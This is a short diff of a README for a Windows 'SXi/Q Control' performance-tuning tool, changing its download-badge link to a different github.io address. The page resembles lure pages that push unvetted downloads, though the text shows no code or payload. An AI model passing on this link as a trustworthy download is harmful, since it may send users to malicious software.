@@ -2,7 +2,8 @@
 
 SXi/Q Control is an advanced control layer for fine-tuning system performance, latency behavior, task prioritization, and thermal/power characteristics. Perfect for gamers, engineers, creators, and performance-sensitive workflows.
 
-[![📥 Download SXi/Q Control](https://img.shields.io/badge/Download-SXiQ_Control-blueviolet)](https://sxiq-control-optimizer.github.io/.github)
+[![📥 Download SXi/Q Control](https://img.shields.io/badge/Download-SXiQ_Control-blueviolet)](https://sxiq-control-optimizer-for-windows.github.io/.github
+)
 
 ---
 
